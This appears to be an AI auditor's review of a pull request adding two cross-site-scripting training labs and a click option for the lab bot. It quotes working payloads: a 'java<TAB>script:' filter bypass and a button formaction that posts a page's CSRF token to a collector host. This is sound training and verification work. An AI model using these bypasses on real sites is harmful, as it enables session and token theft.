# Review: batch/track-xss-g-interactive (PR #22) — PASS

**Auditor:** denetle (independent live verify, Fable 5.1) · **Head:** 99d96cf · **Base:** main (reviewed branch head as-is; the shared-doc conflicts vs advanced main are additive/keep-both, builder resolves at merge).
**Labs:** markdown-renderer-javascript-uri-bypass, formaction-xss-button-injection (both practitioner) — interaction-gated XSS. **Infra:** packages/xss-verifier XSSBOT_CLICK_SELECTOR.

## Verdict: PASS — both labs + the shared-bot infra change cleared to merge. No blocking findings.

## Infra change (packages/xss-verifier — XSSBOT_CLICK_SELECTOR)
Minimal + backward-compatible, verified by inspection AND live runs:
- `bot.py`: `click_selector: str | None = None`; the click runs only inside `if self.click_selector:` (after settle) via `page.eval_on_selector(sel, "el => el.click()")` + a second settle, wrapped in try/except (no-match/broken payload is a no-op). `__main__.py`: `click_selector=os.environ.get("XSSBOT_CLICK_SELECTOR") or None`.
- **Backward-compat is airtight:** unset env → None → ZERO new lines execute → the other 24 XSS labs' load-only behaviour is unchanged. No posture change; the selector is author-supplied (lab compose), never attacker input, and the eval callback is a fixed `el.click()` — no injection surface. The click activates only elements already on the bot-loaded page, which lives on the egress-dropped backend.
- Also lands the OBS-3 image-naming doc (websec-lab/ size+Trivy-gated vs xssbot/ infra-exempt). Good.

## Per-lab live results
1. **markdown-renderer-javascript-uri-bypass** — sink: markdown `[t](url)` → single-pass `re.sub(r"javascript:","",url,IGNORECASE)` then raw into `href="…"` (only `"`→`&quot;`). Bypass `java<TAB>script:` survives the strip; browser normalises the tab on navigation. Bot loads /admin/review, clicks `a.wiki-link`. Exploit exit 0; admin session exfil'd; flag == my HMAC. NEGATIVE CONTROL: tab-LESS `javascript:` → stripped to an inert relative href → 0 beacons EVEN WITH the click (proves both the sanitiser and that the click alone doesn't beacon — only the executing js-uri does). Since `"` is escaped, there's no attribute breakout / auto-firing handler → the js-uri-on-click is the SOLE vector, so the click delivery is genuinely necessary (honest). Posture ×3, anti-bypass 403s, egress blocked, secret dropped, no baked flag, Trivy CLEAN.
2. **formaction-xss-button-injection** — sink: nh3 0.2.20 allow-list keeps `<button formaction/formmethod>`; the draft renders INSIDE the editor's approve form (hidden CSRF token, no action). Bot clicks `.draft button` → the CTA's `formaction="http://collector:9000/report" formmethod="post"` overrides the form target → POSTs the whole form (CSRF token included) to the collector. NO JavaScript. Exploit exit 0; exfil'd CSRF == my INDEPENDENT derivation (`hmac(secret,"admin-csrf|<slug>")[:32]`); flag == my HMAC. Cookie is deliberately HttpOnly — the stolen secret is a form field, proving HttpOnly/CSP are irrelevant to a scriptless form-field exfil. NEGATIVE CONTROL: `<img onerror>`+`<script>` → nh3 strips → 0 beacons. Posture, egress, hygiene clean; Trivy incl. nh3 0.2.20 → 0 vulns.

## Your review asks — VERIFIED
- **Verification integrity / negative controls:** both 0-beacon controls confirmed live; neither lab false-positives.
- **Click-delivery honesty:** confirmed. Both sinks genuinely require the victim CLICK — a `javascript:` URI needs activation; a form needs a submit. The selectors model a plausible review workflow (open the primary link; click the CTA to preview), not an attacker-only hook. No load-only path to either secret.
- **nh3 allow-list — only hole is `<button formaction>` to http(s), no script pivot:** VERIFIED via a direct in-container nh3 probe. `formaction="javascript:…"`, `JavaScript:`, `java<TAB>script:`, and `data:…` are ALL stripped (nh3 scheme-filters formaction); `formaction="http://…"` is kept. `<script>`/`<img onerror>`/`onclick`/`<a href=javascript:>` all neutralised. It's an attribute-semantics gap, not a weak filter. risk:low is honest (this lab executes NO JavaScript at all).
- **HttpOnly-on-purpose (formaction):** confirmed `bot_login` sets `httponly=True`; the lesson lands.
- **Flask re-platform per Hybrid policy:** confirmed — catalog reconciled ONLY these 2 slugs from Node/Express + Node/NestJS to Flask 3.1; tech_stack matches meta.json; no collateral drift.

## Cross-lab
- Diff scope: 2 lab dirs + packages/xss-verifier + shared CHANGELOG/catalog/xss.md. gitleaks: no leaks in either lab or the package.

Cleared to squash-merge + tag batch/track-xss-g-interactive.
